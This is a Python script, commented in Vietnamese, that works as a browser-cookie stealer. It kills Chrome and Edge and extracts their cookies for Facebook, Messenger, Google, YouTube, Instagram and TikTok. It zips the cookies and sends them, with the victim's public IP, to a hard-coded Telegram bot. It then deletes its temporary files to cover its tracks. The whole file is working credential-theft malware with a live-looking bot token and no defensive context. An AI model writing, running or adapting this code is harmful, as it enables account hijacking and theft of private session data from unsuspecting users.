import subprocess
import asyncio
import os
import zipfile
from telegram import Bot
import json
import browser_cookie3
import socket
import requests
import datetime
import sys
import tempfile
import shutil

temp_dir = tempfile.gettempdir()

# Đường dẫn đến thư mục mới trong thư mục Temp
new_dir_path = os.path.join(temp_dir, 'thumuc')

try:
    os.makedirs(new_dir_path)
except :
    pass


def print_current_datetime():
    current_datetime = datetime.datetime.now()
    return str(current_datetime.strftime("%H:%M %d/%m/%Y"))


def get_public_ip_address():
    try:
        # Thực hiện yêu cầu đến dịch vụ httpbin để lấy thông tin địa chỉ IP ngoại vi
        response = requests.get('https://httpbin.org/ip')

        # Trích xuất địa chỉ IP từ dữ liệu JSON
        public_ip = response.json().get('origin')

        res=(f"IP: {public_ip}")
        return res
    except requests.RequestException as e:
        res=(f"{e}")
        return "None"
def kill_chrome():
    try:
        if os.name == 'nt':  # Kiểm tra nếu đang chạy trên Windows
            subprocess.Popen('TASKKILL /F /IM chrome.exe /T', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        else:
            subprocess.Popen(['pkill', 'chrome'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        return True
    except Exception as e:
    
        return False
def kill_edge():
    try:
        if os.name == 'nt':  # Kiểm tra nếu đang chạy trên Windows
            subprocess.Popen('TASKKILL /F /IM msedge.exe /T', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        else:
            subprocess.Popen(['pkill', 'msedge'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        return True
    except Exception as e:
        return False
# Thay thế 'YOUR_BOT_TOKEN' bằng mã token của bot Telegram của bạn
BOT_TOKEN = '6948698645:AAGRSex4kCjHHKZSL8PjQsmL41wIE-Bmi30'

# Thay thế 'USER_ID' bằng user ID của người dùng bạn muốn gửi tin nhắn
USER_ID = '7250748991'

def tao_file_cookie(ten_trang_web):
    kill_chrome()
    # Get cookies from Chrome
    ten_trang_web='.'+ten_trang_web
    cookies = browser_cookie3.chrome(domain_name=ten_trang_web)

    # List to store dictionaries representing each cookie
    cookies_list = []

    # Populate cookies_list with dictionaries representing each cookie
    for cookie in cookies:
        cookie_dict = {
            "domain": cookie.domain,
            "expirationDate": cookie.expires if hasattr(cookie, 'expires') else None,
            "httpOnly": cookie.httpOnly if hasattr(cookie, 'httpOnly') else False,
            "hostOnly": cookie.hostOnly if hasattr(cookie, 'hostOnly') else False,
            "name": cookie.name,
            "path": cookie.path,
            "sameSite": cookie.sameSite if hasattr(cookie, 'sameSite') else "no_restriction",
            "secure": cookie.secure if hasattr(cookie, 'secure') else False,
            "session": cookie.session if hasattr(cookie, 'session') else False,
            "storeId": cookie.storeId if hasattr(cookie, 'storeId') else "0",
            "value": cookie.value,
        }
        cookies_list.append(cookie_dict)

    # Convert cookies_list to JSON string
    cookies_json = json.dumps(cookies_list, indent=4)
    return cookies_json
def tao_file_cookie2(ten_trang_web):
    kill_edge()
    # Get cookies from Chrome
    ten_trang_web='.'+ten_trang_web
    cookies = browser_cookie3.edge(domain_name=ten_trang_web)

    # List to store dictionaries representing each cookie
    cookies_list = []

    # Populate cookies_list with dictionaries representing each cookie
    for cookie in cookies:
        cookie_dict = {
            "domain": cookie.domain,
            "expirationDate": cookie.expires if hasattr(cookie, 'expires') else None,
            "httpOnly": cookie.httpOnly if hasattr(cookie, 'httpOnly') else False,
            "hostOnly": cookie.hostOnly if hasattr(cookie, 'hostOnly') else False,
            "name": cookie.name,
            "path": cookie.path,
            "sameSite": cookie.sameSite if hasattr(cookie, 'sameSite') else "no_restriction",
            "secure": cookie.secure if hasattr(cookie, 'secure') else False,
            "session": cookie.session if hasattr(cookie, 'session') else False,
            "storeId": cookie.storeId if hasattr(cookie, 'storeId') else "0",
            "value": cookie.value,
        }
        cookies_list.append(cookie_dict)

    # Convert cookies_list to JSON string
    cookies_json = json.dumps(cookies_list, indent=4)
    return cookies_json
async def send_message_to_telegram(message):
    bot = Bot(token=BOT_TOKEN)
    await bot.send_message(chat_id=USER_ID, text=message)

async def main():
    bot = Bot(token=BOT_TOKEN)
    # Tin nhắn mà bạn muốn gửi
    list_web=['facebook.com',
              'messenger.com',
              'google.com',
              'youtube.com',
              'instagram.com',
              'tiktok.com']
    
    messages={}
    for i in list_web:
        messages[new_dir_path+"//"+i[0]+"sfjndsd" + ".txt"] = tao_file_cookie(i)

    # Ghi các tin nhắn vào các tập tin txt
    for filename, content in messages.items():
        with open(filename, 'w', encoding='utf-8') as file:
            file.write(content)

    # Nén các tập tin txt thành một tập tin zip
    with zipfile.ZipFile(new_dir_path+"//csghjie.zip", 'w') as zipf:
        for filename in messages.keys():
            zipf.write(filename)


    # Gửi tập tin zip dưới dạng tin nhắn từ bot
    await send_message_to_telegram(print_current_datetime()+'\n'+get_public_ip_address())
    with open(new_dir_path+"//csghjie.zip", 'rb') as zip_file:
        await bot.send_document(chat_id=USER_ID, document=zip_file)

    # Xóa các tập tin txt và tập tin zip sau khi gửi
    for filename in messages.keys():
        os.remove(filename)
    os.remove(new_dir_path+"//csghjie.zip")
    ###############
    messages={}
    for i in list_web:
        messages[new_dir_path+"//"+i[0]+"cjvxkf" + "2.txt"]= tao_file_cookie2(i)

    # Ghi các tin nhắn vào các tập tin txt
    for filename, content in messages.items():
        with open(filename, 'w', encoding='utf-8') as file:
            file.write(content)

    # Nén các tập tin txt thành một tập tin zip
    with zipfile.ZipFile(new_dir_path+"///edfff.zip", 'w') as zipf:
        for filename in messages.keys():
            zipf.write(filename)

    
    # Gửi tập tin zip dưới dạng tin nhắn từ bot
    with open(new_dir_path+"//edfff.zip", 'rb') as zip_file:
        await bot.send_document(chat_id=USER_ID, document=zip_file)

    # Xóa các tập tin txt và tập tin zip sau khi gửi
    for filename in messages.keys():
        os.remove(filename)
    os.remove(new_dir_path+"//edfff.zip")
    shutil.rmtree(new_dir_path)
    ############
    
    sys.exit()

asyncio.run(main())

